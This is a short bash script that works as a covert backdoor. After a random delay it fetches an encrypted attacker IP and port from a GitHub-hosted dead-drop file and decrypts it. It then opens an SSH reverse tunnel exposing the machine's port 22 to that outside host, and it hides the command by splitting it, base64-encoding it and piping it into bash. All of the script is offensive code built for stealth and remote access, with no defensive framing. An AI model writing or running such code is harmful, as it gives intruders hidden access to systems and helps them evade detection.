#!/bin/bash

# GitHub URL hosting AES-encrypted IP:PORT string
GITHUB_URL="https://raw.githubusercontent.com/username/repo-name/main/encrypted.txt"
KEY="yourSecretPassphrase"

# Random delay: 60–240 seconds
sleep $((RANDOM % 180 + 60))

# Fetch & decrypt the connection data
ENCODED=$(curl -s "$GITHUB_URL")
DECRYPTED=$(echo "$ENCODED" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$KEY" 2>/dev/null)

# Extract IP & Port
R_IP="${DECRYPTED%%:*}"
R_PORT="${DECRYPTED##*:}"

# SSH obfuscated command segments
CMD1="ssh"
CMD2="-N"
CMD3="-R"
CMD4="$R_PORT:localhost:22"
CMD5="user@$R_IP"

# Assemble and encode command
SSH_CMD="$CMD1 $CMD2 $CMD3 $CMD4 $CMD5"
ENCODED_CMD=$(echo "$SSH_CMD" | base64)

# Execute reverse tunnel
echo "$ENCODED_CMD" | base64 -d | bash
